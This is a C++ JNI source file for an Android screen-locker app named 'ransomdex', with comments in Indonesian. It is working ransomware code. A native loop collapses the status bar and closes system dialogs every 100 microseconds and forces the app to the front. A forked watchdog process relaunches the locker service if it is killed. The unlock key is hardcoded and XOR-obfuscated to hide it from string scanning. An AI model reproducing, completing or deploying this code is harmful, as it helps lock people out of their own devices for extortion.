#include <jni.h>
#include <string>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <signal.h>

JavaVM* jvm = nullptr;
jobject serviceObject = nullptr;
bool isRunning = false;

void* aggressiveLoop(void* args) {
    JNIEnv* env;
    if (jvm->AttachCurrentThread(&env, nullptr) != JNI_OK) return nullptr;

    jclass clazz = env->GetObjectClass(serviceObject);
    jmethodID collapseMethod = env->GetMethodID(clazz, "collapseStatusBar", "()V");
    jmethodID closeDialogsMethod = env->GetMethodID(clazz, "closeSystemDialogs", "()V");
    jmethodID forceFrontMethod = env->GetMethodID(clazz, "forceFront", "()V");

    int forceCounter = 0;

    while (isRunning) {
        // Panggil fungsi Java dari native thread untuk menutup UI Sistem
        env->CallVoidMethod(serviceObject, collapseMethod);
        env->CallVoidMethod(serviceObject, closeDialogsMethod);

        // Force front setiap 10ms (100 iterasi x 100us)
        if (++forceCounter >= 100) {
            env->CallVoidMethod(serviceObject, forceFrontMethod);
            forceCounter = 0;
        }

        // Jeda sangat tipis 100 microsecond (Amabjut Pro Level)
        usleep(100);
    }

    jvm->DetachCurrentThread();
    return nullptr;
}

void startWatchdog(const char* cmd) {
    pid_t pid = fork();
    if (pid == 0) { // Proses anak (Watchdog)
        pid_t ppid = getppid();
        while (true) {
            if (kill(ppid, 0) == -1) { // Jika parent (Java) mati
                system(cmd); // Jalankan kembali servis
                exit(0);
            }
            sleep(1); // Cek setiap 1 detik
        }
    }
}

extern "C" JNIEXPORT void JNICALL
Java_com_bondex_ransomdex_LockerService_startNativeAggression(JNIEnv* env, jobject thiz, jstring serviceName) {
    if (isRunning) return;
    
    env->GetJavaVM(&jvm);
    serviceObject = env->NewGlobalRef(thiz);
    isRunning = true;

    const char* cmdStr = env->GetStringUTFChars(serviceName, nullptr);
    char fullCmd[256];
    sprintf(fullCmd, "am startservice --user 0 -n %s", cmdStr);
    
    startWatchdog(fullCmd);
    env->ReleaseStringUTFChars(serviceName, cmdStr);

    pthread_t thread;
    pthread_create(&thread, nullptr, aggressiveLoop, nullptr);
}

extern "C" JNIEXPORT void JNICALL
Java_com_bondex_ransomdex_LockerService_stopNativeAggression(JNIEnv* env, jobject thiz) {
    isRunning = false;
    if (serviceObject != nullptr) {
        env->DeleteGlobalRef(serviceObject);
        serviceObject = nullptr;
    }
}

// Keamanan Standar Militer Ambajut Xlock Galaxy Bimasakti
// Implementasi hashing sederhana namun kuat di level native
extern "C" JNIEXPORT jboolean JNICALL
Java_com_bondex_ransomdex_LockerService_verifyAdvancedKey(JNIEnv* env, jobject thiz, jstring input) {
    if (input == nullptr) return JNI_FALSE;

    const char* nativeInput = env->GetStringUTFChars(input, nullptr);
    std::string inputStr(nativeInput);

    // Kunci Rahasia Obfuskasi: "dexambajut4444"
    // Disimpan dalam bentuk ter-XOR agar tidak muncul di command 'strings'
    unsigned char obfuscated_key[] = {
        0x6A, 0x6B, 0x76, 0x6F, 0x63, 0x6C, 0x6F, 0x64, 0x7B, 0x7A, 0x3A, 0x3A, 0x3A, 0x3A
    };
    size_t key_len = 14;

    bool isValid = false;
    if (inputStr.length() == key_len) {
        isValid = true;
        for (size_t i = 0; i < key_len; i++) {
            if (inputStr[i] != (obfuscated_key[i] ^ 0x0E)) {
                isValid = false;
                break;
            }
        }
    }

    env->ReleaseStringUTFChars(input, nativeInput);

    if (isValid) return JNI_TRUE;
    return JNI_FALSE;
}